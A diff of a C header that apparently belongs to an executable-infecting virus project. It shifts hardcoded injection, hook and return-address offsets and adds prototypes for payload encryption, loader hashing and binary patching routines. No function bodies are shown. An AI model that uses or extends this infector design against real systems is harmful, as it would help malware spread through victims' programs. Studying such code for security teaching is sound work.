@@ -25,24 +25,24 @@
 # define MAIN_OFFSET 0x3a6c - FT_MEMCPY_ADDR
 # define INJECT_SIZE LOADER_SIZE + SIGN_SIZE + 8
 
-# define OFFSET_1 0x27f9 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_2 0x25ea + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_3 0x283b + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_1 0x2d1f + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_2 0x2ca2 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_3 0x2d61 + BIS_SIZE - FT_MEMCPY_ADDR
 # define OFFSET_4 0x3a77 + BIS_SIZE - FT_MEMCPY_ADDR
 # define OFFSET_5 0x161c + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_6 0x3523 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_RIP 0x3532 - FT_MEMCPY_ADDR
+# define OFFSET_6 0x35d3 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_RIP 0x35e2 - FT_MEMCPY_ADDR
 
-# define OFFSET_HOOK_1 0x354d + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_1 0x3543 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_HOOK_2 0x357a + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_2 0x3570 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_HOOK_3 0x35a7 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_3 0x359d + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_HOOK_4 0x35d4 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_4 0x35ca + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_HOOK_5 0x3601 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_5 0x35f7 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_1 0x35fd + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_1 0x35f3 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_2 0x362a + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_2 0x3620 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_3 0x3657 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_3 0x364d + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_4 0x3684 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_4 0x367a + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_5 0x36b1 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_5 0x36a7 + BIS_SIZE - FT_MEMCPY_ADDR
 
 typedef struct		s_info
 {
@@ -94,6 +94,20 @@ void		write_proc(char *buf);
 void		write_exe(char *buf);
 void		write_inhibitor(char *buf);
 void		write_stat(char *buf);
+
+/*			**** UTILS ****					*/
+void		itoa(char *buf, int32_t nb);
+
+/*			**** CRYPTO ****					*/
+uint32_t	encrypt(t_info *info, void *ptr, size_t size, uint32_t fingerprint);
+uint32_t	hash_loader(t_info *info);
+void		patch_key(t_info *info, uint32_t key);
+
+/*			**** PATCH ****					*/
+void		patch_addresses(t_info *info);
+void		patch_bis(t_info *info, int32_t nb);
+void		patch_payload(t_info *info);
+void		patch_loader(t_info *info, uint32_t hash);
 
 /*			**** PARSING ****					*/
 int			find_text(t_info *info, t_fingerprint *fingerprint);
